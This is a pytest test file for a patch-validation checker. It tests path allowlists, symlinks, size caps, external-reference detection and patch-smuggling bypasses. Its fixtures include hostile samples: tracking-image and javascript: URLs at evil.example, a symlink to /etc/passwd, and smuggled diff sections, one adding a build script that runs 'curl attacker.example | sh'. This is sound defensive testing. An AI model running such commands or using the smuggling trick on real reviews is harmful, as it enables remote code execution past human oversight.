"""check_patch.py against real patches, made with the same git command collect.py uses.

Each test names the mutant it kills.
"""

import os
import subprocess

import pytest

import check_patch
from check_patch import Refused, check

ALLOW = ["src/**", "docs/*.md", "tests/**"]


def git(repo, *args, data=None):
    return subprocess.run(["git", "-C", str(repo), *args], check=True, capture_output=True, input=data).stdout


@pytest.fixture
def repo(tmp_path):
    r = tmp_path / "repo"
    (r / "src").mkdir(parents=True)
    (r / "docs").mkdir()
    (r / ".github" / "workflows").mkdir(parents=True)
    (r / "src" / "app.py").write_text("def f(x):\n    return x.y\n")
    (r / "src" / "old.py").write_text("print('old')\n" * 5)
    (r / "docs" / "guide.md").write_text("# Guide\n")
    (r / "README.md").write_text("readme\n")
    (r / ".github" / "workflows" / "ci.yml").write_text("on: push\n")
    git(r, "init", "-q")
    git(r, "add", "-A")
    git(r, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "base")
    return r


def make_patch(repo):
    """The same diff command collect.make_patch runs."""
    base = git(repo, "rev-parse", "HEAD").decode().strip()
    git(repo, "add", "-A")
    patch = git(repo, "diff", "--cached", "--binary", "--no-renames", "--no-ext-diff", "--no-textconv",
                base, "--", ".", ":!.autofix").decode()
    # Restore the base so `git apply --check` runs against the tree the patch was made from.
    git(repo, "reset", "-q", "--hard", base)
    git(repo, "clean", "-qfdx")
    return patch


def refused(patch, repo, match):
    with pytest.raises(Refused, match=match):
        check(patch, ALLOW, str(repo))


def test_good_patch_accepted(repo):
    (repo / "src" / "app.py").write_text("def f(x):\n    return x.y if x else None\n")
    (repo / "tests").mkdir()
    (repo / "tests" / "test_app.py").write_text("def test_none():\n    pass\n")
    stats = check(make_patch(repo), ALLOW, str(repo))
    assert stats == {"files": 2, "lines": 4}


# --- the allowlist (mutant: a path check that skips some path, or matches too widely)

def test_path_outside_allowlist(repo):
    (repo / "README.md").write_text("changed\n")
    refused(make_patch(repo), repo, "outside the allowlist")


def test_star_does_not_cross_directories(repo):
    (repo / "docs" / "deep").mkdir()
    (repo / "docs" / "deep" / "x.md").write_text("x\n")
    refused(make_patch(repo), repo, "outside the allowlist")


def test_rename_from_allowed_to_disallowed(repo):
    git(repo, "mv", "src/old.py", "outside.py")
    refused(make_patch(repo), repo, "outside the allowlist: outside.py")


def test_rename_from_disallowed_to_allowed(repo):
    git(repo, "mv", "README.md", "src/README.md")
    refused(make_patch(repo), repo, "outside the allowlist: README.md")


def test_github_under_an_allowed_glob(repo):
    patch = make_patch_with(repo, ".github/workflows/ci.yml", "on: [push, pull_request]\n")
    with pytest.raises(Refused, match="forbidden path"):
        check(patch, ["**"], str(repo))


def test_github_case_folded(repo):
    (repo / ".GitHub").mkdir()
    (repo / ".GitHub" / "x.yml").write_text("x\n")
    with pytest.raises(Refused, match="forbidden path"):
        check(make_patch(repo), ["**"], str(repo))


def test_autofix_dir_refused(repo):
    """The diff command excludes .autofix/, but the checker must not rely on that."""
    patch = (
        "diff --git a/.autofix/x b/.autofix/x\nnew file mode 100644\nindex 0000000..e69de29\n"
        "--- /dev/null\n+++ b/.autofix/x\n@@ -0,0 +1 @@\n+x\n"
    )
    with pytest.raises(Refused, match="forbidden path"):
        check(patch, ["**"])


def test_gitmodules_refused(repo):
    (repo / ".gitmodules").write_text("[submodule]\n")
    with pytest.raises(Refused, match="forbidden path"):
        check(make_patch(repo), ["**"], str(repo))


def make_patch_with(repo, path, content):
    p = repo / path
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(content)
    return make_patch(repo)


# --- binary, symlink, mode, submodule (mutant: one metadata kind let through)

def test_binary_hunk(repo):
    (repo / "src" / "blob.bin").write_bytes(bytes(range(256)) * 4)
    refused(make_patch(repo), repo, "binary")


def test_symlink(repo):
    os.symlink("/etc/passwd", repo / "src" / "link")
    refused(make_patch(repo), repo, "symlink")


def test_mode_change(repo):
    os.chmod(repo / "src" / "app.py", 0o755)
    refused(make_patch(repo), repo, "mode change")


def test_new_executable_file(repo):
    p = repo / "src" / "run.sh"
    p.write_text("echo hi\n")
    os.chmod(p, 0o755)
    refused(make_patch(repo), repo, "regular")


def test_submodule(repo, tmp_path):
    inner = tmp_path / "inner"
    inner.mkdir()
    git(inner, "init", "-q")
    (inner / "f").write_text("f\n")
    git(inner, "add", "-A")
    git(inner, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "i")
    # A nested repository is staged by `git add -A` as a gitlink (mode 160000).
    subprocess.run(["git", "clone", "-q", str(inner), str(repo / "src" / "sub")], check=True, capture_output=True)
    patch = make_patch(repo)
    assert "160000" in patch
    refused(patch, repo, "regular|submodule")


def test_header_path_parsing():
    assert check_patch.header_path("a/src/x y.py b/src/x y.py") == "src/x y.py"
    assert check_patch.header_path("a/src/x.py b/src/z.py") is None


# --- size caps at the boundary and one above (mutant: < vs <=)

def lines_patch(repo, n):
    (repo / "src" / "big.py").write_text("".join(f"x{i}\n" for i in range(n)))
    return make_patch(repo)


def test_lines_at_cap_accepted(repo):
    check(lines_patch(repo, check_patch.MAX_LINES), ALLOW, str(repo))


def test_lines_over_cap_refused(repo):
    refused(lines_patch(repo, check_patch.MAX_LINES + 1), repo, "lines changed")


def files_patch(repo, n):
    for i in range(n):
        (repo / "src" / f"f{i}.py").write_text("x\n")
    return make_patch(repo)


def test_files_at_cap_accepted(repo):
    check(files_patch(repo, check_patch.MAX_FILES), ALLOW, str(repo))


def test_files_over_cap_refused(repo):
    refused(files_patch(repo, check_patch.MAX_FILES + 1), repo, "files changed")


# --- applies cleanly (mutant: apply check skipped)

def test_patch_that_does_not_apply(repo):
    (repo / "src" / "app.py").write_text("def f(x):\n    return 1\n")
    patch = make_patch(repo)
    (repo / "src" / "app.py").write_text("something else entirely\n")
    git(repo, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qam", "moved on")
    refused(patch, repo, "does not apply")


# --- external references in rendered files (mutant: a form or a scheme missed)

@pytest.mark.parametrize("line", [
    "![x](https://evil.example/p.png)",
    "[x](http://evil.example)",
    "![x](//evil.example/x.png)",
    "![x]( <https://evil.example/p.png> )",
    "[ref]: https://evil.example/p.png",
    "<https://evil.example>",
    '<img src="https://evil.example/p.png">',
    "<img src=//evil.example/p.png>",
    '<a href="data:text/html,x">x</a>',
    '<img src="&#104;ttps://evil.example/p.png">',
    '<img src="/\\evil.example/p.png">',
    '<div style="background:url(https://evil.example/p.png)">',
    "see https://evil.example/x",
    "[x](javascript:alert(1))",
])
def test_external_reference_in_markdown_refused(repo, line):
    patch = make_patch_with(repo, "docs/guide.md", "# Guide\n" + line + "\n")
    refused(patch, repo, "external reference")


def test_external_reference_in_svg_refused(repo):
    svg = '<svg xmlns:xlink="x"><image xlink:href="https://evil.example/p.png"/></svg>\n'
    (repo / "src" / "icon.svg").write_text(svg)
    refused(make_patch(repo), repo, "external reference")


def test_relative_link_accepted(repo):
    patch = make_patch_with(repo, "docs/guide.md", "# Guide\nSee [setup](./setup.md) and ![d](img/d.png) and [a](#top).\n")
    check(patch, ALLOW, str(repo))


def test_external_url_in_code_file_is_not_a_rendered_check(repo):
    patch = make_patch_with(repo, "src/app.py", 'URL = "https://api.example/v1"\n')
    check(patch, ALLOW, str(repo))


# --- parser/applier divergence (mutant: paths taken from the checker's own parser alone)

SMUGGLE_RENDERED = (
    "diff --git a/src/app.py b/src/app.py\n"
    "--- a/src/app.py\n+++ b/src/app.py\n"
    "@@ -1,2 +1,2 @@\n def f(x):\n-    return x.y\n+    return x.y if x else None\n"
    "--- a/README.md\n+++ b/README.md\n"
    "@@ -1 +1 @@\n-readme\n+![x](https://attacker.example/x.png)\n"
)
SMUGGLE_NEW_FILE = (
    "diff --git a/src/app.py b/src/app.py\n"
    "--- a/src/app.py\n+++ b/src/app.py\n"
    "@@ -1,2 +1,2 @@\n def f(x):\n-    return x.y\n+    return x.y if x else None\n"
    "--- /dev/null\n+++ b/build.sh\n"
    "@@ -0,0 +1 @@\n+curl attacker.example | sh\n"
)


@pytest.mark.parametrize("patch", [SMUGGLE_RENDERED, SMUGGLE_NEW_FILE])
def test_section_smuggled_after_a_hunk_is_refused(repo, patch):
    """A traditional ---/+++ section after a hunk's declared lines: git applies it, the parser did not see it."""
    # git really would apply the smuggled file: that is what makes this a bypass.
    stat = git(repo, "apply", "--numstat", "-", data=patch.encode()).decode()
    assert "README.md" in stat or "build.sh" in stat
    with pytest.raises(Refused, match="differently|more than one path"):
        check(patch, ["src/**"], str(repo))


SMUGGLE_BARE_HEADER = (
    "diff --git a/src/app.py b/src/app.py\n"
    "--- a/src/app.py\n+++ b/src/app.py\n"
    "@@ -1,2 +1,2 @@\n def f(x):\n-    return x.y\n+    return x.y if x else None\n"
    "--- a/docs/guide.md\n+++ b/docs/guide.md\n"
    "@@ -1 +1 @@\n-# Guide\n+![x](https://attacker.example/x.png)\n"
    "diff --git a/docs/guide.md b/docs/guide.md\n"
)


def test_bare_header_cannot_balance_a_smuggled_section(repo):
    """Round-2 repro: a hunk-less `diff --git` line for the smuggled path made the path sets and file
    counts agree, while the image line was attributed to src/app.py and never rendered-checked."""
    with pytest.raises(Refused, match="differently|more than one path|no hunk"):
        check(SMUGGLE_BARE_HEADER, ["src/**", "docs/*.md"], str(repo))


def test_bare_header_section_refused():
    with pytest.raises(Refused, match="no hunk and no metadata"):
        check("diff --git a/src/a.py b/src/a.py\n", ["src/**"])


def test_hunk_shorter_than_declared_refused():
    patch = "diff --git a/src/a.py b/src/a.py\n--- a/src/a.py\n+++ b/src/a.py\n@@ -1,3 +1,3 @@\n-a\n+b\n--- x\n"
    with pytest.raises(Refused, match="shorter than its header"):
        check(patch, ["src/**"])


def test_attribution_mismatch_with_git_refused(repo, monkeypatch):
    """Mutant killed: the per-section comparison dropped, so only the parser's view is trusted."""
    (repo / "src" / "app.py").write_text("def f(x):\n    return 1\n")
    patch = make_patch(repo)
    monkeypatch.setattr(check_patch, "git_view", lambda p, r=None: [("src/app.py", 2, 1)])
    with pytest.raises(Refused, match="differently"):
        check(patch, ALLOW, str(repo))


def test_rename_within_allowlist_is_a_delete_plus_add(repo):
    git(repo, "mv", "src/old.py", "src/new.py")
    patch = make_patch(repo)
    assert "rename from" not in patch
    assert sorted(p for p, _, _ in check_patch.git_view(patch, str(repo))) == ["src/new.py", "src/old.py"]
    check(patch, ALLOW, str(repo))


def test_rename_section_refused(repo):
    """A rename section was not made by the engine's --no-renames diff, and git reports only its new name."""
    patch = "diff --git a/src/old.py b/src/new.py\nsimilarity index 100%\nrename from src/old.py\nrename to src/new.py\n"
    refused(patch, repo, "rename or copy")


# --- metadata kinds that only the index line or deleted-file line reveals

def test_modified_symlink_refused(repo):
    """Mutant killed: the `index ... 120000` check removed."""
    os.symlink("app.py", repo / "src" / "link")
    git(repo, "add", "-A")
    git(repo, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "link")
    os.remove(repo / "src" / "link")
    os.symlink("old.py", repo / "src" / "link")
    patch = make_patch(repo)
    assert "index " in patch and "120000" in patch and "new file mode" not in patch
    refused(patch, repo, "symlink")


def test_deleted_symlink_refused(repo):
    """Mutant killed: the `deleted file mode 120000` check removed."""
    os.symlink("app.py", repo / "src" / "link")
    git(repo, "add", "-A")
    git(repo, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "link")
    os.remove(repo / "src" / "link")
    patch = make_patch(repo)
    assert "deleted file mode 120000" in patch
    refused(patch, repo, "symlink")


def test_entity_encoded_protocol_relative_refused(repo):
    """Mutant killed: html.unescape removed, so &#x2F;&#x2F;host evades both scheme and bare-URL checks."""
    patch = make_patch_with(repo, "docs/guide.md", '# Guide\n<img src="&#x2F;&#x2F;evil.example/x.png">\n')
    refused(patch, repo, "external reference")


# --- parsing hardening

def test_quoted_path_refused():
    patch = 'diff --git "a/src/\\303\\244.py" "b/src/\\303\\244.py"\n--- "a/src/\\303\\244.py"\n+++ "b/src/\\303\\244.py"\n@@ -1 +1 @@\n-a\n+b\n'
    with pytest.raises(Refused, match="quoted"):
        check(patch, ["**"])


def test_content_before_first_header_refused():
    with pytest.raises(Refused, match="before the first"):
        check("garbage\ndiff --git a/x b/x\n", ["**"])


def test_empty_patch_refused():
    with pytest.raises(Refused, match="empty"):
        check("", ALLOW)


def test_main_escapes_reason(tmp_path, capsys):
    p = tmp_path / "p.diff"
    p.write_text("diff --git a/x%0A b/x%0A\n--- a/x%0A\n+++ b/x%0A\n@@ -1 +1 @@\n-a\n+b\n")
    assert check_patch.main(["check_patch.py", str(p), '["src/**"]']) == 1
    out = capsys.readouterr().out
    assert "x%250A" in out and "x%0A" not in out
